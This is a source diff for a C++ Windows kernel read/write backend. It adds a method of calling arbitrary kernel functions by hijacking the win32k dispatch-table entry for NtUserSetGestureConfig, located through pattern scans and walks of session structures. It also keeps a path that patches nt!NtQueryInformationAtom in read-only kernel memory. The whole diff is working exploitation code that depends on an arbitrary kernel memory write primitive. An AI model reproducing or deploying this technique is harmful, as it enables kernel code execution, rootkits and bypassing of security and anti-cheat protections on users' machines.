@@ -3,8 +3,41 @@
 #include <memory>
 
 
+#ifndef HIGHEST_USER_ADDRESS
+#define HIGHEST_USER_ADDRESS 0x00007fffffffffff
+#endif
+
 namespace
 {
+	bool IsValidKernelAddress( uint64_t pAddress )
+	{
+		if ( !pAddress )
+			return false;
+
+		if ( pAddress < HIGHEST_USER_ADDRESS )
+			return false;
+
+		return *reinterpret_cast<USHORT*>( reinterpret_cast<std::uintptr_t>( &pAddress ) + 6 ) == 0xFFFF;
+	}
+
+	uint64_t GetKernelExportOffset( const wchar_t* moduleName, const char* functionName )
+	{
+		const auto module = LoadLibraryExW( moduleName, nullptr, DONT_RESOLVE_DLL_REFERENCES );
+
+		if ( !module )
+			return 0;
+
+		const auto function = r_cast<uint64_t>( GetProcAddress( module, functionName ) );
+		const auto base = r_cast<uint64_t>( module );
+
+		FreeLibrary( module );
+
+		if ( !function )
+			return 0;
+
+		return function - base;
+	}
+
 	uint64_t GetKernelModuleAddressByName( const char* moduleName )
 	{
 		if ( !moduleName )
@@ -58,7 +91,34 @@ NTSTATUS KernelRwCallBackend::Load( )
 	if ( !m_Ntoskrnl )
 		return 0x9110;
 
+	if ( m_CallGate == KernelCallGate::TableSwap )
+	{
+		LoadLibraryW( pstrw( L"user32.dll" ) );
+		LoadLibraryW( pstrw( L"win32u.dll" ) );
+
+		m_NtUserSetGestureConfigRef = ResolveNtUserSetGestureConfigRef( );
+
+		if ( m_NtUserSetGestureConfigRef )
+		{
+			LOG_SEC( "[+] - [%s] NtUserSetGestureConfig_ref 0x%llx", Name( ).c_str( ), m_NtUserSetGestureConfigRef );
+		}
+		else
+		{
+			LOG_SEC( "[-] - [%s] NtUserSetGestureConfig_ref not found", Name( ).c_str( ) );
+		}
+	}
+
 	return STATUS_SUCCESS;
+}
+
+void KernelRwCallBackend::SetCallGate( KernelCallGate gate )
+{
+	m_CallGate = gate;
+}
+
+KernelCallGate KernelRwCallBackend::GetCallGate( ) const
+{
+	return m_CallGate;
 }
 
 NTSTATUS KernelRwCallBackend::Unload( )
@@ -125,9 +185,90 @@ bool KernelRwCallBackend::WriteToReadOnlyMemory( uint64_t address, const void* b
 	return WriteMemory( address, buffer, size );
 }
 
-bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
+bool KernelRwCallBackend::PrepareKernelCallGestureConfig( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
 {
-	if ( !userFunction || !restoreAddress || !originalBytes || !originalSize )
+	if ( !kernelFunctionAddress || !userFunction || !restoreAddress || !originalBytes || !originalSize )
+		return false;
+
+	if ( !m_NtUserSetGestureConfigRef )
+	{
+		LoadLibraryW( pstrw( L"user32.dll" ) );
+		LoadLibraryW( pstrw( L"win32u.dll" ) );
+		m_NtUserSetGestureConfigRef = ResolveNtUserSetGestureConfigRef( );
+	}
+
+	if ( !m_NtUserSetGestureConfigRef )
+	{
+		LOG_SEC( "[-] - [%s] PrepareKernelCallGestureConfig: NtUserSetGestureConfig_ref is null", Name( ).c_str( ) );
+		return false;
+	}
+
+	auto win32u = GetModuleHandleW( pstrw( L"win32u.dll" ) );
+	if ( !win32u )
+		win32u = LoadLibraryW( pstrw( L"win32u.dll" ) );
+
+	if ( !win32u )
+	{
+		LOG_SEC( "[-] - [%s] Failed to load win32u.dll", Name( ).c_str( ) );
+		return false;
+	}
+
+	*userFunction = r_cast<void*>( GetProcAddress( win32u, pstra( "NtUserSetGestureConfig" ) ) );
+
+	if ( !*userFunction )
+	{
+		LOG_SEC( "[-] - [%s] Failed to get export win32u!NtUserSetGestureConfig", Name( ).c_str( ) );
+		return false;
+	}
+
+	constexpr size_t pointerSize = sizeof( uint64_t );
+
+	if ( !ReadMemory( m_NtUserSetGestureConfigRef, originalBytes, pointerSize ) )
+	{
+		LOG_SEC( "[-] - [%s] Failed to read NtUserSetGestureConfig_ref 0x%llx", Name( ).c_str( ), m_NtUserSetGestureConfigRef );
+		return false;
+	}
+
+	if ( !WriteMemory( m_NtUserSetGestureConfigRef, &kernelFunctionAddress, pointerSize ) )
+	{
+		LOG_SEC( "[-] - [%s] Failed to write NtUserSetGestureConfig_ref 0x%llx -> 0x%llx", Name( ).c_str( ), m_NtUserSetGestureConfigRef, kernelFunctionAddress );
+		return false;
+	}
+
+	*restoreAddress = m_NtUserSetGestureConfigRef;
+	*originalSize = pointerSize;
+	return true;
+}
+
+bool KernelRwCallBackend::RestoreKernelCallGestureConfig( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
+{
+	if ( !restoreAddress || !originalBytes || originalSize != sizeof( uint64_t ) )
+	{
+		LOG_SEC( "[-] - [%s] RestoreKernelCallGestureConfig invalid parameters restoreAddress=0x%llx size=%llu",
+			Name( ).c_str( ), restoreAddress, originalSize );
+		return false;
+	}
+
+	if ( restoreAddress != m_NtUserSetGestureConfigRef )
+	{
+		LOG_SEC( "[-] - [%s] RestoreKernelCallGestureConfig unexpected restore address 0x%llx expected 0x%llx",
+			Name( ).c_str( ), restoreAddress, m_NtUserSetGestureConfigRef );
+		return false;
+	}
+
+	if ( !WriteMemory( restoreAddress, originalBytes, originalSize ) )
+	{
+		LOG_SEC( "[-] - [%s] Failed to restore NtUserSetGestureConfig_ref 0x%llx", Name( ).c_str( ), restoreAddress );
+		return false;
+	}
+
+	LOG_SEC( "[*] - [%s] Restored NtUserSetGestureConfig_ref 0x%llx", Name( ).c_str( ), restoreAddress );
+	return true;
+}
+
+bool KernelRwCallBackend::PrepareKernelCallAtom( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
+{
+	if ( !kernelFunctionAddress || !userFunction || !restoreAddress || !originalBytes || !originalSize )
 		return false;
 
 	const auto ntdll = LoadLibraryW( pstrw( L"ntdll.dll" ) );
@@ -139,7 +280,7 @@ bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, voi
 
 	if ( !*userFunction )
 	{
-		LOG_SEC( "[-] - [%s] Failed to resolve ntdll!NtQueryInformationAtom", Name( ) );
+		LOG_SEC( "[-] - [%s] Failed to resolve ntdll!NtQueryInformationAtom", Name( ).c_str( ) );
 		return false;
 	}
 
@@ -147,7 +288,7 @@ bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, voi
 
 	if ( !kernelNtQueryInformationAtom )
 	{
-		LOG_SEC( "[-] - [%s] Failed to resolve nt!NtQueryInformationAtom", Name( ) );
+		LOG_SEC( "[-] - [%s] Failed to resolve nt!NtQueryInformationAtom", Name( ).c_str( ) );
 		return false;
 	}
 
@@ -156,13 +297,13 @@ bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, voi
 
 	if ( !ReadMemory( kernelNtQueryInformationAtom, originalBytes, sizeof( jumpStub ) ) )
 	{
-		LOG_SEC( "[-] - [%s] Failed to read nt!NtQueryInformationAtom", Name( ) );
+		LOG_SEC( "[-] - [%s] Failed to read nt!NtQueryInformationAtom", Name( ).c_str( ) );
 		return false;
 	}
 
 	if ( !WriteToReadOnlyMemory( kernelNtQueryInformationAtom, jumpStub, sizeof( jumpStub ) ) )
 	{
-		LOG_SEC( "[-] - [%s] Failed to patch nt!NtQueryInformationAtom", Name( ) );
+		LOG_SEC( "[-] - [%s] Failed to patch nt!NtQueryInformationAtom (provider lacks RX modification permission)", Name( ).c_str( ) );
 		return false;
 	}
 
@@ -171,18 +312,34 @@ bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, voi
 	return true;
 }
 
-bool KernelRwCallBackend::RestoreKernelCall( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
+bool KernelRwCallBackend::RestoreKernelCallAtom( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
 {
 	if ( !restoreAddress || !originalBytes || !originalSize )
 		return false;
 
 	if ( !WriteToReadOnlyMemory( restoreAddress, originalBytes, originalSize ) )
 	{
-		LOG_SEC( "[-] - [%s] Failed to restore kernel call gate", Name( ) );
+		LOG_SEC( "[-] - [%s] Failed to restore kernel call gate (Atom)", Name( ).c_str( ) );
 		return false;
 	}
 
 	return true;
+}
+
+bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
+{
+	if ( m_CallGate == KernelCallGate::TableSwap )
+		return PrepareKernelCallGestureConfig( kernelFunctionAddress, userFunction, restoreAddress, originalBytes, originalSize );
+
+	return PrepareKernelCallAtom( kernelFunctionAddress, userFunction, restoreAddress, originalBytes, originalSize );
+}
+
+bool KernelRwCallBackend::RestoreKernelCall( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
+{
+	if ( m_CallGate == KernelCallGate::TableSwap )
+		return RestoreKernelCallGestureConfig( restoreAddress, originalBytes, originalSize );
+
+	return RestoreKernelCallAtom( restoreAddress, originalBytes, originalSize );
 }
 
 uint64_t KernelRwCallBackend::GetKernelModuleExport( uint64_t kernelModuleBase, const char* functionName )
@@ -601,3 +758,186 @@ uint64_t KernelRwCallBackend::FindCallInRange( uint64_t address, size_t size )
 
 	return 0;
 }
+
+uint64_t KernelRwCallBackend::ResolveNtUserSetGestureConfigRef( )
+{
+	const uint64_t exportOffset = GetKernelExportOffset( pstrw( L"win32kfull.sys" ), pstra( "NtUserSetGestureConfig" ) );
+
+	LOG_SEC( "[*] - [%s] NtUserSetGestureConfig export offset 0x%llx", Name( ).c_str( ), exportOffset );
+
+	if ( !exportOffset )
+		return 0;
+
+	const uint64_t win32k = GetKernelModuleAddressByName( pstra( "win32k.sys" ) );
+	const uint64_t win32kfull = GetKernelModuleAddressByName( pstra( "win32kfull.sys" ) );
+
+	LOG_SEC( "[*] - [%s] win32k=0x%llx win32kfull=0x%llx", Name( ).c_str( ), win32k, win32kfull );
+
+	if ( !win32k || !win32kfull )
+		return 0;
+
+	if ( GetBuildNumber( ) >= 22631 ) // Above 23H2
+	{
+		LOG_SEC( "[-] - [%s] NtUserSetGestureConfig_ref not found by win32k ref scan, trying SessionState path", Name( ).c_str( ) );
+		return ResolveNtUserSetGestureConfigRefFromSessionState( win32k, win32kfull + exportOffset );
+	}
+
+	uint64_t* pFoundPointers = reinterpret_cast<uint64_t*>( VirtualAlloc( nullptr, sizeof( uint64_t ) * 3000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
+
+	if ( !pFoundPointers )
+	{
+		LOG_SEC( "[-] - [%s] Failed to allocate memory for found pointers", Name( ).c_str( ) );
+		return 0;
+	}
+
+	size_t foundCount = 0;
+
+	// 48 8B 05 ?? ?? ?? ?? 48 85 C0
+	if ( FindPatternInSectionAll( pstra( ".text" ), win32k, 
+		"\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0", pstra( "xxx????xxx" ), 
+		pFoundPointers, 3000, &foundCount ) )
+	{
+		for ( size_t i = 0; i < foundCount; ++i )
+		{
+			if ( !IsValidKernelAddress( pFoundPointers[ i ] ) )
+				continue;
+
+			uint64_t pointerAddress = ResolveRelativeAddress( pFoundPointers[ i ], 3, 7 );
+
+			if ( !IsValidKernelAddress( pointerAddress ) )
+				continue;
+
+			uint64_t functionAddress = 0;
+
+			if ( !ReadMemory( pointerAddress, &functionAddress, sizeof( functionAddress ) ) )
+				continue;
+
+			const uint64_t currentOffset = functionAddress - win32kfull;
+
+			LOG_SEC( "[!] - [%s] pointerAddress=0x%llX, currentOffset=0x%llX, exportOffset=0x%llX", Name( ).c_str( ), pointerAddress, currentOffset, exportOffset );
+			if ( currentOffset != exportOffset )
+				continue;
+
+			LOG_SEC( "[+] - [%s] NtUserSetGestureConfig_ref found by win32k ref scan 0x%llX", Name( ).c_str( ), pointerAddress );
+
+			VirtualFree( pFoundPointers, 0, MEM_RELEASE );
+			return pointerAddress;
+		}
+	}
+
+	VirtualFree( pFoundPointers, 0, MEM_RELEASE );
+	return 0;	
+}
+
+uint64_t KernelRwCallBackend::ResolveNtUserSetGestureConfigRefFromSessionState( uint64_t win32k, uint64_t ntUserSetGestureConfigFull )
+{
+	DWORD sessionId = 0;
+	if ( !ProcessIdToSessionId( GetCurrentProcessId( ), &sessionId ) || !sessionId )
+	{
+		LOG_SEC( "[-] - [%s] Failed to query current session id", Name( ).c_str( ) );
+		return 0;
+	}
+
+	const ULONG ulSubsystemOffset      = 0x88;
+	const ULONG ulDispatchTable1Offset = 0x138;
+	const ULONG ulDispatchTable2Offset = 0x150;
+
+	LOG_SEC( "[*] - [%s] Session ID %lu", Name( ).c_str( ), sessionId );
+
+	// 48 8B 05 ? ? ? ? FF C9 48 8B 04 C8
+	uint64_t gSessionGlobalSlotsRef = FindPatternInSection( pstra( ".text" ), win32k,
+		"\x48\x8B\x05\x00\x00\x00\x00\xFF\xC9\x48\x8B\x04\xC8", pstra( "xxx????xxxxxx" ) );
+
+	if ( !gSessionGlobalSlotsRef )
+	{
+		LOG_SEC( "[-] - [%s] gSessionGlobalSlotsRef not found", Name( ).c_str( ) );
+		return 0;
+	}
+
+	uint64_t gSessionGlobalSlots = ResolveRelativeAddress( gSessionGlobalSlotsRef, 3, 7 );
+
+	LOG_SEC( "[*] - [%s] gSessionGlobalSlots 0x%llx", Name( ).c_str( ), gSessionGlobalSlots );
+
+	uint64_t sessionGlobalSlotsInstance = 0;
+
+	if ( !ReadMemory( gSessionGlobalSlots, &sessionGlobalSlotsInstance, sizeof( sessionGlobalSlotsInstance ) ) )
+		return 0;
+
+	LOG_SEC( "[*] - [%s] SessionGlobalSlotsInstance 0x%llx", Name( ).c_str( ), sessionGlobalSlotsInstance );
+
+	if ( !IsValidKernelAddress( sessionGlobalSlotsInstance ) )
+	{
+		LOG_SEC( "[-] - [%s] SessionGlobalSlotsInstance is not valid", Name( ).c_str( ) );
+		return 0;
+	}
+
+	uint64_t uSessionState = 0;
+
+	if ( !ReadMemory( sessionGlobalSlotsInstance + 8ull * ( sessionId - 1 ), &uSessionState, sizeof( uSessionState ) ) )
+		return 0;
+
+	LOG_SEC( "[*] - [%s] uSessionState 0x%llx", Name( ).c_str( ), uSessionState );
+
+	if ( !IsValidKernelAddress( uSessionState ) )
+	{
+		LOG_SEC( "[-] - [%s] uSessionState is not valid", Name( ).c_str( ) );
+		return 0;
+	}
+
+	uint64_t uSubsystem = 0;
+
+	if ( !ReadMemory( uSessionState + ulSubsystemOffset, &uSubsystem, sizeof( uSubsystem ) ) )
+		return 0;
+
+	LOG_SEC( "[*] - [%s] uSubsystem 0x%llx", Name( ).c_str( ), uSubsystem );
+
+	if ( !IsValidKernelAddress( uSubsystem ) )
+	{
+		LOG_SEC( "[-] - [%s] uSubsystem is not valid", Name( ).c_str( ) );
+		return 0;
+	}
+
+	uint64_t uDispatchTable1 = 0;
+
+	if ( !ReadMemory( uSubsystem + ulDispatchTable1Offset, &uDispatchTable1, sizeof( uDispatchTable1 ) ) )
+		return 0;
+
+	LOG_SEC( "[*] - [%s] uDispatchTable1 0x%llx", Name( ).c_str( ), uDispatchTable1 );
+
+	if ( !IsValidKernelAddress( uDispatchTable1 ) )
+	{
+		LOG_SEC( "[-] - [%s] uDispatchTable1 is not valid", Name( ).c_str( ) );
+		return 0;
+	}
+
+	uint64_t uDispatchTable2 = 0;
+
+	if ( !ReadMemory( uSubsystem + ulDispatchTable2Offset, &uDispatchTable2, sizeof( uDispatchTable2 ) ) )
+		return 0;
+
+	LOG_SEC( "[*] - [%s] uDispatchTable2 0x%llx", Name( ).c_str( ), uDispatchTable2 );
+
+	if ( !IsValidKernelAddress( uDispatchTable2 ) )
+	{
+		LOG_SEC( "[-] - [%s] uDispatchTable2 is not valid", Name( ).c_str( ) );
+		return 0;
+	}
+
+	auto DataTable = std::make_unique<uint64_t[ ]>( 0x1000 / sizeof( uint64_t ) );
+
+	if ( !ReadMemory( uDispatchTable2, DataTable.get( ), 0x1000 ) )
+		return 0;
+
+	for ( size_t i = 0; i < ( 0x1000 / sizeof( uint64_t ) ); ++i )
+	{
+		if ( DataTable[ i ] != ntUserSetGestureConfigFull )
+			continue;
+
+		const auto result = uDispatchTable2 + i * sizeof( uint64_t );
+		LOG_SEC( "[+] - [%s] NtUserSetGestureConfigRef found by SessionState 0x%llx offset=0x%llx", Name( ).c_str( ), result, i * sizeof( uint64_t ) );
+		return result;
+	}
+
+	return 0;
+}
+
